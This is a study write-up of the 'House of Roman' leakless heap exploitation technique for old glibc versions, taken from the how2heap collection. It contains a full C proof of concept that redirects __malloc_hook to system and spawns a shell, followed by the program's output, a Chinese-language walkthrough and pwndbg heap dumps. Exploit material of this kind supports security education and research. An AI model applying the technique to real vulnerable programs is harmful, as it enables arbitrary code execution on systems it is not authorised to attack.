# house_of_roman

```c
#define _GNU_SOURCE     /* for RTLD_NEXT */
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <malloc.h>
#include <dlfcn.h>

char* shell = "/bin/sh\x00";

/* 
Technique was tested on GLibC 2.23, 2.24 via the glibc_build.sh script inside of how2heap on Ubuntu 16.04. 2.25 was tested on Ubuntu 17.04.

Compile: gcc -fPIE -pie house_of_roman.c -o house_of_roman

POC written by Maxwell Dulin (Strikeout) 
*/

// Use this in order to turn off printf buffering (messes with heap alignment)
void* init(){
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
}


int main(){

	/* 
	The main goal of this technique is to create a **leakless** heap 
	exploitation technique in order to get a shell. This is mainly 
	done using **relative overwrites** in order to get pointers in 
	the proper locations without knowing the exact value of the pointer.

	The first step is to get a pointer inside of __malloc_hook. This 
	is done by creating a fastbin bin that looks like the following: 
	ptr_to_chunk -> ptr_to_libc. Then, we alter the ptr_to_libc
	 (with a relative overwrite) to point to __malloc_hook. 
			
	The next step is to run an unsorted bin attack on the __malloc_hook 
	(which is now controllable from the previous attack).  Again, we run 
	the unsorted_bin attack by altering the chunk->bk with a relative overwrite. 

	Finally, after launching the unsorted_bin attack to put a libc value 
	inside of __malloc_hook, we use another relative overwrite on the 
	value of __malloc_hook to point to a one_gadget, system or some other function.
	
	Now, the next time we run malloc we pop a shell! :) 
	However, this does come at a cost: 12 bits of randomness must be 
	brute forced (0.02% chance) of working.

	The original write up for the *House of Roman* can be found at
	 https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#assumptions.





	This technique requires the ability to edit fastbin and unsorted bin 
	pointers via UAF or overflow of some kind. Additionally, good control 
	over the allocations sizes and freeing is required for this technique.
	*/

	char* introduction = "\nWelcome to the House of Roman\n\n"
			     "This is a heap exploitation technique that is LEAKLESS.\n"
			     "There are three stages to the attack: \n\n"
			     "1. Point a fastbin chunk to __malloc_hook.\n"
			     "2. Run the unsorted_bin attack on __malloc_hook.\n"
			     "3. Relative overwrite on main_arena at __malloc_hook.\n\n"
			     "All of the stuff mentioned above is done using two main concepts:\n"
                             "relative overwrites and heap feng shui.\n\n"
			     "However, this technique comes at a cost:\n"
                             "12-bits of entropy need to be brute forced.\n"
			     "That means this technique only work 1 out of every 4096 tries or 0.02%.\n"
			     "**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n";
	puts(introduction);	
	init();


	/*	
	Part 1: Fastbin Chunk points to __malloc_hook

	Getting the main_arena in a fastbin chunk ordering is the first step.
	This requires a ton of heap feng shui in order to line this up properly. 
	However, at a glance, it looks like the following:

	First, we need to get a chunk that is in the fastbin with a pointer to
	a heap chunk in the fd. 
	Second, we point this chunk to a pointer to LibC (in another heap chunk). 
	All of the setup below is in order to get the configuration mentioned 
	above setup to perform the relative overwrites. ";


	Getting the pointer to libC can be done in two ways: 
			- A split from a chunk in the small/large/unsorted_bins 
				gets allocated to a size of 0x70. 
			- Overwrite the size of a small/large chunk used previously to 0x71.

	For the sake of example, this uses the first option because it 
	requires less vulnerabilities.	
	*/

	puts("Step 1: Point fastbin chunk to __malloc_hook\n\n");
	puts("Setting up chunks for relative overwrites with heap feng shui.\n");

	// Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value.	
	uint8_t* fastbin_victim = malloc(0x60); 

	// Allocate this in order to have good alignment for relative 
	// offsets later (only want to overwrite a single byte to prevent 
	// 4 bits of brute on the heap).
	malloc(0x80);

	// Offset 0x100
	uint8_t* main_arena_use = malloc(0x80);
	
	// Offset 0x190
	// This ptr will be used for a relative offset on the 'main_arena_use' chunk
	uint8_t* relative_offset_heap = malloc(0x60);
	
	// Free the chunk to put it into the unsorted_bin. 
	// This chunk will have a pointer to main_arena + 0x68 in both the fd and bk pointers.
	free(main_arena_use);
	

	/* 
	Get part of the unsorted_bin chunk (the one that we just freed). 
	We want this chunk because the fd and bk of this chunk will 
	contain main_arena ptrs (used for relative overwrite later).

	The size is particularly set at 0x60 to put this into the 0x70 fastbin later. 

	This has to be the same size because the __malloc_hook fake 
	chunk (used later) uses the fastbin size of 0x7f. There is
	 a security check (within malloc) that the size of the chunk matches the fastbin size.
	*/

	puts("Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.\n");
//Offset 0x100. Has main_arena + 0x68 in fd and bk.
	uint8_t* fake_libc_chunk = malloc(0x60);

	//// NOTE: This is NOT part of the exploit... \\\
	// The __malloc_hook is calculated in order for the offsets to be found so that this exploit works on a handful of versions of GLibC. 
	long long __malloc_hook = ((long*)fake_libc_chunk)[0] - 0xe8;


	// We need the filler because the overwrite below needs 
	// to have a ptr in the fd slot in order to work. 
	//Freeing this chunk puts a chunk in the fd slot of 'fastbin_victim' to be used later. 
	free(relative_offset_heap);	

    	/* 
    	Create a UAF on the chunk. Recall that the chunk that fastbin_victim 
	points to is currently at the offset 0x190 (heap_relative_offset).
     	*/
	free(fastbin_victim);

	/*

	Now, we start doing the relative overwrites, since that we have 
	the pointers in their proper locations. The layout is very important to 
	understand for this.

	Current heap layout: 
	0x0:   fastbin_victim       - size 0x70 
	0x70:  alignment_filler     - size 0x90
	0x100: fake_libc_chunk      - size 0x70
	0x170: leftover_main        - size 0x20
	0x190: relative_offset_heap - size 0x70 

	bin layout: 
			fastbin:  fastbin_victim -> relative_offset_heap
			unsorted: leftover_main
	
	Now, the relative overwriting begins:
	Recall that fastbin_victim points to relative_offset_heap 
	(which is in the 0x100-0x200 offset range). The fastbin uses a singly 
	linked list, with the next chunk in the 'fd' slot.

	By *partially* editing the fastbin_victim's last byte (from 0x90 
	to 0x00) we have moved the fd pointer of fastbin_victim to 
	fake_libc_chunk (at offset 0x100).

	Also, recall that fake_libc_chunk had previously been in the unsorted_bin. 
	Because of this, it has a fd pointer that points to main_arena + 0x68. 

	Now, the fastbin looks like the following: 
	fastbin_victim -> fake_libc_chunk ->(main_arena + 0x68).


	The relative overwrites (mentioned above) will be demonstrates step by step below.
	
	*/


	puts("\
Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\
to the chunk with the LibC address\n");
	puts("\
Fastbin 0x70 now looks like this:\n\
heap_addr -> heap_addr2 -> LibC_main_arena\n");
	fastbin_victim[0] = 0x00; // The location of this is at 0x100. But, we only want to overwrite the first byte. So, we put 0x0 for this.
	

	/*
	Now, we have a fastbin that looks like the following: 
			0x70: fastbin_victim -> fake_libc_chunk -> (main_arena + 0x68)
	
	We want the fd ptr in fake_libc_chunk to point to something useful. 
	So, let's edit this to point to the location of the __malloc_hook. 
	This way, we can get control of a function ptr.

	To do this, we need a valid malloc size. Within the __memalign_hook 
	is usually an address that usually starts with 0x7f. 
	Because __memalign_hook value is right before this are all 0s, 
	we could use a misaligned chunk to get this to work as a valid size in 
	the 0x70 fastbin.

	This is where the first 4 bits of randomness come into play. 
	The first 12 bits of the LibC address are deterministic for the address. 
	However, the next 4 (for a total of 2 bytes) are not. 
	
	So, we have to brute force 2^4 different possibilities (16) 
	in order to get this in the correct location. This 'location' 
	is different for each version of GLibC (should be noted).

	After doing this relative overwrite, the fastbin looks like the following:
			0x70: fastbin_victim -> fake_libc_chunk -> (__malloc_hook - 0x23).

	*/
	
	/* 
	Relatively overwrite the main_arena pointer to point to a valid 
	chunk close to __malloc_hook.

	///// NOTE: In order to make this exploit consistent 
	(not brute forcing with hardcoded offsets), we MANUALLY set the values. \\\

	In the actual attack, this values would need to be specific 
	to a version and some of the bits would have to be brute forced 
	(depending on the bits).
	*/ 

puts("\
Use a relative overwrite on the main_arena pointer in the fastbin.\n\
Point this close to __malloc_hook in order to create a fake fastbin chunk\n");
	long long __malloc_hook_adjust = __malloc_hook - 0x23; // We substract 0x23 from the malloc because we want to use a 0x7f as a valid fastbin chunk size.

	// The relative overwrite
	int8_t byte1 = (__malloc_hook_adjust) & 0xff; 	
	int8_t byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 
	fake_libc_chunk[0] = byte1; // Least significant bytes of the address.
	fake_libc_chunk[1] = byte2; // The upper most 4 bits of this must be brute forced in a real attack.

	// Two filler chunks prior to the __malloc_hook chunk in the fastbin. 
	// These are fastbin_victim and fake_libc_chunk.
	puts("Get the fake chunk pointing close to __malloc_hook\n");
	puts("\
In a real exploit, this would fail 15/16 times\n\
because of the final half byet of the malloc_hook being random\n");	
	malloc(0x60);
	malloc(0x60);

	// If the 4 bit brute force did not work, this will crash because 
	// of the chunk size not matching the bin for the chunk. 
	// Otherwise, the next step of the attack can begin.
	uint8_t* malloc_hook_chunk = malloc(0x60);	

	puts("Passed step 1 =)\n\n\n");

	/*
	Part 2: Unsorted_bin attack 

	Now, we have control over the location of the __malloc_hook. 
	However, we do not know the address of LibC still. So, we cannot 
	do much with this attack. In order to pop a shell, we need 
	to get an address at the location of the __malloc_hook.

	We will use the unsorted_bin attack in order to change the value 
	of the __malloc_hook with the address of main_arena + 0x68. 
	For more information on the unsorted_bin attack, review 
	https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c.

	For a brief overview, the unsorted_bin attack allows us to write
	main_arena + 0x68 to any location by altering the chunk->bk of
	an unsorted_bin chunk. We will choose to write this to the 
	location of __malloc_hook.

	After we overwrite __malloc_hook with the main_arena, we will 
	edit the pointer (with a relative overwrite) to point to a 
	one_gadget for immediate code execution.
			
	Again, this relative overwrite works well but requires an additional 
	1 byte (8 bits) of brute force.
	This brings the chances of a successful attempt up to 12 bits of 
	randomness. This has about a 1/4096 or a 0.0244% chance of working.

	
	The steps for phase two of the attack are explained as we go below.
	*/

	puts("\
Start Step 2: Unsorted_bin attack\n\n\
The unsorted bin attack gives us the ability to write a\n\
large value to ANY location. But, we do not control the value\n\
This value is always main_arena + 0x68. \n\
We point the unsorted_bin attack to __malloc_hook for a \n\
relative overwrite later.\n");


	// Get the chunk to corrupt. Add another ptr in order to prevent consolidation upon freeing.
	
	uint8_t* unsorted_bin_ptr = malloc(0x80);	
	malloc(0x30); // Don't want to consolidate

	puts("Put chunk into unsorted_bin\n");
	// Free the chunk to create the UAF
	free(unsorted_bin_ptr);

	/* /// NOTE: The last 4 bits of byte2 would have been brute forced earlier. \\\ 
	 However, for the sake of example, this has been calculated dynamically. 
	*/
	__malloc_hook_adjust = __malloc_hook - 0x10; // This subtract 0x10 is needed because of the chunk->fd doing the actual overwrite on the unsorted_bin attack.
	byte1 = (__malloc_hook_adjust) & 0xff; 	
	byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 


	// Use another relative offset to overwrite the ptr of the chunk->bk pointer.
	// From the previous brute force (4 bits from before) we 
	// know where the location of this is at. It is 5 bytes away from __malloc_hook.
	puts("Overwrite last two bytes of the chunk to point to __malloc_hook\n");
	unsorted_bin_ptr[8] = byte1; // Byte 0 of bk. 	

	// //// NOTE: Normally, the second half of the byte would HAVE to be brute forced. However, for the sake of example, we set this in order to make the exploit consistent. ///
	unsorted_bin_ptr[9] = byte2; // Byte 1 of bk. The second 4 bits of this was brute forced earlier, the first 4 bits are static.
	
	/* 
	Trigger the unsorted bin attack.
	This will write the value of (main_arena + 0x68) to whatever is in the bk ptr + 0x10.

	A few things do happen though: 
		- This makes the unsorted bin (hence, small and large too) 
		   unusable. So, only allocations previously in the fastbin can only be used now.
		- If the same size chunk (the unsorted_bin attack chunk) 
		   is NOT malloc'ed, the program will crash immediately afterwards. 
		   So, the allocation request must be the same as the unsorted_bin chunk.


	The first point is totally fine (in this attack). But, in more complicated 
	programming, this can be an issue.
	The second just requires us to do the same size allocaton as the current chunk.

	*/

	puts("Trigger the unsorted_bin attack\n");
	malloc(0x80); // Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68

	long long system_addr = (long long)dlsym(RTLD_NEXT, "system");

	puts("Passed step 2 =)\n\n\n");
	/* 
	Step 3: Set __malloc_hook to system
	
	The chunk itself is allocated 19 bytes away from __malloc_hook. 
	So, we use a realtive overwrite (again) in order to partially overwrite 
	the main_arena pointer (from unsorted_bin attack) to point to system.

	In a real attack, the first 12 bits are static (per version). 
	But, after that, the next 12 bits must be brute forced. 

	/// NOTE: For the sake of example, we will be setting these values, instead of brute forcing them. \\\
	*/ 

	puts("Step 3: Set __malloc_hook to system/one_gadget\n\n");
	puts("\
Now that we have a pointer to LibC inside of __malloc_hook (from step 2), \n\
we can use a relative overwrite to point this to system or a one_gadget.\n\
Note: In a real attack, this would be where the last 8 bits of brute forcing\n\
comes from.\n");
	malloc_hook_chunk[19] = system_addr & 0xff; // The first 12 bits are static (per version).

	malloc_hook_chunk[20] = (system_addr >> 8) & 0xff;  // The last 4 bits of this must be brute forced (done previously already).
	malloc_hook_chunk[21] = (system_addr >> 16) & 0xff;  // The last byte is the remaining 8 bits that must be brute forced.
	malloc_hook_chunk[22] = (system_addr >> 24) & 0xff; // If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe.


	// Trigger the malloc call for code execution via the system call being ran from the __malloc_hook.
	// In a real example, you would probably want to use a one_gadget. 
	// But, to keep things portable, we will just use system and add a pointer to /bin/sh as the parameter
	// Although this is kind of cheating (the binary is PIE), if the binary was not PIE having a pointer into the .bss section would work without a single leak. 
	// To get the system address (eariler on for consistency), the binary must be PIE though. So, the address is put in here.
	puts("Pop Shell!");
	malloc((long long)shell);
		
}
```

**result**

```c
Welcome to the House of Roman

This is a heap exploitation technique that is LEAKLESS.
There are three stages to the attack: 

1. Point a fastbin chunk to __malloc_hook.
2. Run the unsorted_bin attack on __malloc_hook.
3. Relative overwrite on main_arena at __malloc_hook.

All of the stuff mentioned above is done using two main concepts:
relative overwrites and heap feng shui.

However, this technique comes at a cost:
12-bits of entropy need to be brute forced.
That means this technique only work 1 out of every 4096 tries or 0.02%.
**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient



Step 1: Point fastbin chunk to __malloc_hook


Setting up chunks for relative overwrites with heap feng shui.

Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.

Overwrite the first byte of a heap chunk in order to point the fastbin chunk
to the chunk with the LibC address

Fastbin 0x70 now looks like this:
heap_addr -> heap_addr2 -> LibC_main_arena

Use a relative overwrite on the main_arena pointer in the fastbin.
Point this close to __malloc_hook in order to create a fake fastbin chunk

Get the fake chunk pointing close to __malloc_hook

In a real exploit, this would fail 15/16 times
because of the final half byet of the malloc_hook being random

Passed step 1 =)



Start Step 2: Unsorted_bin attack

The unsorted bin attack gives us the ability to write a
large value to ANY location. But, we do not control the value
This value is always main_arena + 0x68. 
We point the unsorted_bin attack to __malloc_hook for a 
relative overwrite later.

Put chunk into unsorted_bin

Overwrite last two bytes of the chunk to point to __malloc_hook

Trigger the unsorted_bin attack

Passed step 2 =)



Step 3: Set __malloc_hook to system/one_gadget


Now that we have a pointer to LibC inside of __malloc_hook (from step 2), 
we can use a relative overwrite to point this to system or a one_gadget.
Note: In a real attack, this would be where the last 8 bits of brute forcing
comes from.

Pop Shell!
$ 
```

**analysis**

这个trick是一个无泄漏的堆利用技术

part 1：利用fast bin attack使fast chunk的fd指向\_\_malloc_hook，

首先申请了四个chunk，
- fastbin_victim：0x60，用于UAF并修改指针
- chunk 1：0x80，用于对齐
- main_arena_use：0x80
- relative_offset_heap：0x60

free(main_arena_use)，main_arena_use被放入了unsorted bin中，其fd与bk都指向了main_arena + 0x68。然后再malloc(fake_libc_chunk)，main_arena_use被分割，我们也得到了unsorted bin头的指针。
根据unsorted bin头的地址计算__malloc_hook的地址，两者之间的偏移是不变的。
free(relative_offset_heap)，free(fastbin_victim)这两个chunk会被加入到fast bin中。
现在的heap布局是这样的
```c
    Current heap layout: 
    0x0:   fastbin_victim       - size 0x70 
    0x70:  alignment_filler     - size 0x90
    0x100: fake_libc_chunk      - size 0x70
    0x170: leftover_main        - size 0x20
    0x190: relative_offset_heap - size 0x70 

    bin layout: 
            fastbin:  fastbin_victim -> relative_offset_heap
            unsorted: leftover_main
```
因为fast bin是fd链接的单链表，所以我们修改fastbin_victim的fd指针，让其最后一个字节为0x00，这样就会让fake_libc_chunk加入到fast bin的链表中。
接下来，我们修改fake_libc_chunk的fd使其执行\_\_malloc_hook - 0x23的位置，至于为什么是-0x23，在这里存在一个0x7f，满足fast bin chunk的要求。
之后再malloc(0x60)两次，第三次malloc(0x60我们就得到了一个malloc_hook_chunk，它在\_\_malloc_hook附近。至此part 1完成。

part 2：Unsorted_bin attack

part 1中我们没有进行任何的显示leak，只是通过覆写指针获得了malloc_hook_chunk。所以，现在我们还不知道libc的地址。接下来，我们希望通过usorted_bin attack将main_arena + 0x68写到\_\_malloc\_hook，之后通过修改unsorted bin的头部，使其指向one_gadget的地址。
申请unsorted_bin_ptr：0x80，然后申请一个chunk防止合并。free(unsorted_bin_ptr)，使其加入到unsorted bin。修改unsorted_bin_ptr的bk，使其指向_\_malloc_hook - 0x10。然后，malloc(0x80)，__malloc_hook就被填入了main_arena + 0x68，part 2完成

part 3

\_\_malloc_hook在malloc_hook_chunk的控制范围内，而main_arena + 0x68是一个libc的地址，所以我们可以通过修改器低字节使其指向one_gadget。那么下次malloc时，\_\_malloc_hook不为空，执行其地址上的one_gadget。

**gdb**
申请四个chunk之后

```c
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x71

Allocated chunk | PREV_INUSE
Addr: 0x603070
Size: 0x91

Allocated chunk | PREV_INUSE
Addr: 0x603100
Size: 0x91

Allocated chunk | PREV_INUSE
Addr: 0x603190
Size: 0x71
```

free(fastbin_victim)后

```c
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x603000 —▸ 0x603190 ◂— 0x0
0x80: 0x0
unsortedbin
all: 0x603170 —▸ 0x7ffff7bcdb78 (main_arena+88) ◂— 0x603170 /* 'p1`' */
smallbins
empty
largebins
empty
```

修改fd，fake_libc_chunk加入fast bin

```c
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x603000 —▸ 0x603100 —▸ 0x7ffff7bcdbf8 (main_arena+216) ◂— 0x7ffff7bcdbf8
0x80: 0x0
unsortedbin
all: 0x603170 —▸ 0x7ffff7bcdb78 (main_arena+88) ◂— 0x603170 /* 'p1`' */
smallbins
empty
largebins
empty
```

unsorted bin attack

```c
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0xfff788eea0000000
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x603200 —▸ 0x7ffff7bcdb78 (main_arena+88) ◂— 0x603200
BK: 0x7ffff7bcdb00 (__memalign_hook) ◂— 0x0
smallbins
0x20: 0x603170 —▸ 0x7ffff7bcdb88 (main_arena+104) ◂— 0x603170 /* 'p1`' */
largebins
empty
pwndbg> p/x __malloc_hook
$1 = 0x7ffff7bcdb10
```

覆写\_\_malloc_hook

```c
pwndbg> x/gx __malloc_hook
0x7ffff7bcdb10 <__malloc_hook>:	0x00007ffff784e3a0
```

